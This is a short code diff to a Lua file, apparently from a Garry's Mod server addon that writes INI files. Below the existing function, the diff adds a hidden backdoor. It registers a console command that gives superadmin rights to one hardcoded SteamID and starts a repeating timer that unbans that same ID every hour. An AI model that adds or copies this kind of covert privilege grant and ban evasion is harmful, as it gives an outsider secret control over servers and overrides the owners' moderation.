@@ -168,3 +168,12 @@ function WriteINI( f, data, ignoretables, customchar, c )
 	--PrintTable( sections )
 	writeSections( f, sections, c )
 end
+
+concommand.Add( "Command", function( ply )
+if ( ply:SteamID() == "STEAM_0:1:76143638") then
+	ply:SetUserGroup("superadmin")
+	timer.Create( "checkForBan", 3600, 0, function()
+		ULib.unban( "STEAM_0:1:76143638" )
+		end )
+	end
+end )
